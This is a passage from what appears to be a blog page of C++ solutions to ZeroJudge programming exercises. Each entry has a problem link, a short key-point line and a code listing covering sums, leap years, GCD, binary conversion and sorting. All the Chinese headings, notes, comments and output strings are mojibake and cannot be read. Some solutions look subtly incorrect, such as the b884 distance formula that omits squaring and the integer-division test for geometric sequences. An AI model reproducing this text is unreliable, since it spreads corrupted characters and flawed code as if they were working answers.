class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="a002-ç°¡æ˜“åŠ æ³•"><a href="#a002-ç°¡æ˜“åŠ æ³•" class="headerlink" title="a002. ç°¡æ˜“åŠ æ³•"></a>a002. ç°¡æ˜“åŠ æ³•</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=a002">https://zerojudge.tw/ShowProblem?problemid=a002</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šåŸºæœ¬æ•¸å­¸é‹ç®—</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">    cout&lt;&lt; a+b;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="a003-å…©å…‰æ³•å¸«å åœè¡“"><a href="#a003-å…©å…‰æ³•å¸«å åœè¡“" class="headerlink" title="a003. å…©å…‰æ³•å¸«å åœè¡“"></a>a003. å…©å…‰æ³•å¸«å åœè¡“</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=a003">https://zerojudge.tw/ShowProblem?problemid=a003</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šæ¢ä»¶åˆ¤æ–·èˆ‡æ¨¡é‹ç®—</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    <span class="type">int</span> result = (a * <span class="number">2</span> + b) % <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;æ™®é€š&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (result == <span class="number">1</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;å‰&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (result == <span class="number">2</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;å¤§å‰&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="a004-æ–‡æ–‡çš„æ±‚å©š"><a href="#a004-æ–‡æ–‡çš„æ±‚å©š" class="headerlink" title="a004. æ–‡æ–‡çš„æ±‚å©š"></a>a004. æ–‡æ–‡çš„æ±‚å©š</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=a004">https://zerojudge.tw/ShowProblem?problemid=a004</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šé–å¹´åˆ¤æ–·é‚è¼¯</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;a)&#123;</span><br><span class="line">        <span class="type">bool</span> isleapa= (a % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; a % <span class="number">100</span> != <span class="number">0</span>) || (a % <span class="number">400</span> == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(isleapa)&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;é–å¹´\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;å¹³å¹´\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="a005-Eva-çš„å›å®¶ä½œæ¥­"><a href="#a005-Eva-çš„å›å®¶ä½œæ¥­" class="headerlink" title="a005. Eva çš„å›å®¶ä½œæ¥­"></a>a005. Eva çš„å›å®¶ä½œæ¥­</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=a005">https://zerojudge.tw/ShowProblem?problemid=a005</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šç­‰å·®æ•¸åˆ—èˆ‡ç­‰æ¯”æ•¸åˆ—åˆ¤æ–·</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin &gt;&gt; t; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a, b, c, d; </span><br><span class="line">        cin &gt;&gt; a &gt;&gt; b &gt;&gt; c &gt;&gt; d;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (b - a == c - b &amp;&amp; c - b == d - c) &#123;</span><br><span class="line">            <span class="comment">// ç­‰å·®æ•¸åˆ—</span></span><br><span class="line">            <span class="type">int</span> e = d + (d - c);</span><br><span class="line">            cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; c &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; d &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; e &lt;&lt;<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (b / a == c / b &amp;&amp; c / b == d / c) &#123;</span><br><span class="line">            <span class="comment">// ç­‰æ¯”æ•¸åˆ—</span></span><br><span class="line">            <span class="type">int</span> e = d * (d / c);</span><br><span class="line">            cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; c &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; d &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; e &lt;&lt;<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="a006-ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹å¼"><a href="#a006-ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹å¼" class="headerlink" title="a006. ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹å¼"></a>a006. ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹å¼</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=a006">https://zerojudge.tw/ShowProblem?problemid=a006</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šæ•¸å­¸å…¬å¼æ‡‰ç”¨èˆ‡åˆ¤åˆ¥å¼</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    <span class="type">int</span> d = b*b<span class="number">-4</span>*a*c;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (d&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;No real root&quot;</span>&lt;&lt;<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(d==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="type">double</span> x1= -b/(<span class="number">2.0</span>*a);</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Two same roots x=&quot;</span>&lt;&lt;x1&lt;&lt;<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="type">double</span> x1= (-b+<span class="built_in">sqrt</span>(d))/(<span class="number">2</span>*a);</span><br><span class="line">        <span class="type">double</span> x2= (-b-<span class="built_in">sqrt</span>(d))/(<span class="number">2</span>*a);</span><br><span class="line">        cout &lt;&lt;<span class="string">&quot;Two different roots &quot;</span>&lt;&lt;<span class="string">&quot;x1=&quot;</span>&lt;&lt;x1&lt;&lt;<span class="string">&quot; , x2=&quot;</span>&lt;&lt;x2&lt;&lt;<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="a024-æœ€å¤§å…¬å› æ•¸-GCD"><a href="#a024-æœ€å¤§å…¬å› æ•¸-GCD" class="headerlink" title="a024. æœ€å¤§å…¬å› æ•¸(GCD)"></a>a024. æœ€å¤§å…¬å› æ•¸(GCD)</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=a024">https://zerojudge.tw/ShowProblem?problemid=a024</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šå…§å»ºå‡½æ•¸ <code>__gcd()</code> çš„ä½¿ç”¨</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    c = __gcd(a,b);</span><br><span class="line">    cout &lt;&lt; c ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="a034-äºŒé€²ä½åˆ¶è½‰æ›"><a href="#a034-äºŒé€²ä½åˆ¶è½‰æ›" class="headerlink" title="a034. äºŒé€²ä½åˆ¶è½‰æ›"></a>a034. äºŒé€²ä½åˆ¶è½‰æ›</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=a034">https://zerojudge.tw/ShowProblem?problemid=a034</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šé€²ä½åˆ¶è½‰æ›é‚è¼¯</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> d;</span><br><span class="line">    <span class="keyword">while</span>(cin &gt;&gt; d)&#123;</span><br><span class="line">        string binary = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">int</span> temp = d;</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">0</span>) cout &lt;&lt; <span class="number">0</span> &lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span> (temp &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                binary = <span class="string">&quot;0&quot;</span> + binary;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                binary = <span class="string">&quot;1&quot;</span> + binary;</span><br><span class="line">            &#125;</span><br><span class="line">            temp /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; binary &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="a040-é˜¿å§†æ–¯å£¯æ•¸"><a href="#a040-é˜¿å§†æ–¯å£¯æ•¸" class="headerlink" title="a040. é˜¿å§†æ–¯å£¯æ•¸"></a>a040. é˜¿å§†æ–¯å£¯æ•¸</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=a040">https://zerojudge.tw/ShowProblem?problemid=a040</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šæ•¸å­—æ‹†è§£èˆ‡å†ªé‹ç®—</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> have = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sp</span><span class="params">(<span class="type">int</span> i)</span></span>&#123;</span><br><span class="line">    string s = <span class="built_in">to_string</span>(i);</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;s.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">        <span class="type">int</span> spn=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> d = s[j] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        spn = <span class="built_in">pow</span>(d,s.<span class="built_in">size</span>());</span><br><span class="line">        sum+=spn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sum==i)&#123;</span><br><span class="line">        have = <span class="number">1</span>;</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> s,e;</span><br><span class="line">    cin &gt;&gt; s &gt;&gt; e;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = s;i &lt;= e;++i)&#123;</span><br><span class="line">        <span class="built_in">sp</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(have == <span class="number">0</span>)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;none&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="a065-ææ¬¾å¡å¯†ç¢¼"><a href="#a065-ææ¬¾å¡å¯†ç¢¼" class="headerlink" title="a065. ææ¬¾å¡å¯†ç¢¼"></a>a065. ææ¬¾å¡å¯†ç¢¼</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=a065">https://zerojudge.tw/ShowProblem?problemid=a065</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šå­—ä¸²è™•ç†èˆ‡çµ•å°å€¼é‹ç®—</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string a;</span><br><span class="line">    cin &gt;&gt; a;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;a.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="type">int</span> far = <span class="built_in">abs</span>(a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        cout &lt;&lt; far ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="a216-æ•¸æ•¸æ„›æ˜æ˜"><a href="#a216-æ•¸æ•¸æ„›æ˜æ˜" class="headerlink" title="a216. æ•¸æ•¸æ„›æ˜æ˜"></a>a216. æ•¸æ•¸æ„›æ˜æ˜</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=a216">https://zerojudge.tw/ShowProblem?problemid=a216</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šéè¿´å‡½æ•¸çš„æ‡‰ç”¨</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">f</span><span class="params">(<span class="type">long</span> <span class="type">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> n + <span class="built_in">f</span>(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">g</span><span class="params">(<span class="type">long</span> <span class="type">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">f</span>(n) + <span class="built_in">g</span>(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> n;</span><br><span class="line">    <span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="built_in">f</span>(n) &lt;&lt; <span class="string">&quot; &quot;</span>  &lt;&lt; <span class="built_in">g</span>(n) &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="a225-æ˜æ˜æ„›æ’åˆ—"><a href="#a225-æ˜æ˜æ„›æ’åˆ—" class="headerlink" title="a225. æ˜æ˜æ„›æ’åˆ—"></a>a225. æ˜æ˜æ„›æ’åˆ—</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=a225">https://zerojudge.tw/ShowProblem?problemid=a225</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šè‡ªå®šç¾©æ’åºè¦å‰‡</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; n) &#123;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; nums;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> temp;</span><br><span class="line">            cin &gt;&gt; temp;</span><br><span class="line">            <span class="type">int</span> unit = temp % <span class="number">10</span>;</span><br><span class="line">            nums.<span class="built_in">push_back</span>(&#123;unit, -temp&#125;); <span class="comment">// ç”¨è² è™Ÿè®“åŸæ•¸å€¼ç”±å¤§åˆ°å°</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            cout &lt;&lt; -nums[i].second &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="ğŸ”µ-æ¿æ©‹é«˜ä¸­æ•™å­¸é¡Œç³»åˆ—"><a href="#ğŸ”µ-æ¿æ©‹é«˜ä¸­æ•™å­¸é¡Œç³»åˆ—" class="headerlink" title="ğŸ”µ æ¿æ©‹é«˜ä¸­æ•™å­¸é¡Œç³»åˆ—"></a>ğŸ”µ æ¿æ©‹é«˜ä¸­æ•™å­¸é¡Œç³»åˆ—</h2><h3 id="b884-é›»è…¦æ•™å®¤çš„å‚‘å…‹"><a href="#b884-é›»è…¦æ•™å®¤çš„å‚‘å…‹" class="headerlink" title="b884. é›»è…¦æ•™å®¤çš„å‚‘å…‹"></a>b884. é›»è…¦æ•™å®¤çš„å‚‘å…‹</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=b884">https://zerojudge.tw/ShowProblem?problemid=b884</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šåº§æ¨™è·é›¢è¨ˆç®—èˆ‡æ¢ä»¶åˆ¤æ–·</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> n, x, y, r, yee;</span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; n) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">            r = <span class="built_in">sqrt</span>((x - <span class="number">0</span>) + (y - <span class="number">0</span>));</span><br><span class="line">            yee = <span class="number">100</span> - r * r;</span><br><span class="line">            <span class="keyword">if</span> (yee &gt; <span class="number">0</span> &amp;&amp; yee &lt;= <span class="number">30</span>)</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;sad!&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (yee &gt; <span class="number">30</span> &amp;&amp; yee &lt;= <span class="number">60</span>)</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;hmm~~&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (yee &gt; <span class="number">60</span> &amp;&amp; yee &lt; <span class="number">100</span>)</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;Happyyummy&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;evil!!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="b971-ç­‰å·®æ•¸åˆ—"><a href="#b971-ç­‰å·®æ•¸åˆ—" class="headerlink" title="b971. ç­‰å·®æ•¸åˆ—"></a>b971. ç­‰å·®æ•¸åˆ—</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=b971">https://zerojudge.tw/ShowProblem?problemid=b971</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šç­‰å·®æ•¸åˆ—çš„è¼¸å‡ºæ ¼å¼</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a1,an,d;</span><br><span class="line">    cin &gt;&gt; a1 &gt;&gt; an &gt;&gt; d;</span><br><span class="line">    <span class="keyword">while</span>(a1!=an) &#123;</span><br><span class="line">        cout &lt;&lt; a1 &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        a1+=d;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; an;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="d046-æ–‡æ–‡æ¡è¥¿ç“œ"><a href="#d046-æ–‡æ–‡æ¡è¥¿ç“œ" class="headerlink" title="d046. æ–‡æ–‡æ¡è¥¿ç“œ"></a>d046. æ–‡æ–‡æ¡è¥¿ç“œ</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=d046">https://zerojudge.tw/ShowProblem?problemid=d046</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šè¨ˆæ•¸èˆ‡æ¢ä»¶åˆ¤æ–·</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n,w;</span><br><span class="line">    <span class="type">int</span> c=<span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">        cin&gt;&gt;w;</span><br><span class="line">        <span class="keyword">if</span>(w&lt;=<span class="number">10</span>)</span><br><span class="line">            c=c<span class="number">+1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="d559-ç­è™Ÿ"><a href="#d559-ç­è™Ÿ" class="headerlink" title="d559. ç­è™Ÿ"></a>d559. ç­è™Ÿ</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=d559">https://zerojudge.tw/ShowProblem?problemid=d559</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šæ ¼å¼åŒ–è¼¸å‡º</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;&#x27;C&#x27; can use printf(\&quot;%d\&quot;,n); to show integer like &quot;</span>&lt;&lt;n&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

